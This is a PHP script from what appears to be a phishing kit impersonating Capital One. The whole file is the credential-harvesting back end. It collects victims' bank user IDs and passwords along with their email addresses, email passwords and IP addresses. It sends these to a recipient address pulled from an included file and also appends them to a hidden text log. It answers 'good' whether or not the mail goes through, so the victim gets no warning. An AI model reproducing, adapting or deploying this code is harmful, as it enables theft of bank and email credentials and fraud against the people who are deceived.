<?php
include "../../../x/lock.php";
include "send.php";
ob_start();
session_start();

$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$message = "===========   Capital Email Access   ===========\n";
$message .= "UserID: ".$_SESSION['coid'];
$message .= "Password: ".$_SESSION['copw'];
$message .= "Email Addr: ".$_SESSION['coeml'] = $_POST['coeml']."\n";
$message .= "Email Pass: ".$_SESSION['coempw'] = $_POST['coempw']."\n";
$message .= "================================================\n";
$message .= "IP: ".$ip."\n";
$message .= "Date: ".$adddate."\n";
$message .= "Loc: ".$_SESSION['_DIR_']."\n";
$message .= "================================================\n";

function save($arg) {
	$testfile = fopen("../../../a/KMC.txt", "a") or die("Unable to open file!");
	$txt = $arg;
	fwrite($testfile, $txt);
	fclose($testfile);
}

$subject = "Capital One RZT - $ip - Created By KMC +========== HIDE THIS SHIT ==========+";
$headers = "From: CP1\n";
$headers .= "MIME-Version: 1.0\n";
if (mail($recipient,$subject,$message,$headers)) {
	save($message);
	echo "good";
}
else {
	save($message);
	echo "good";
}
ob_flush();
?>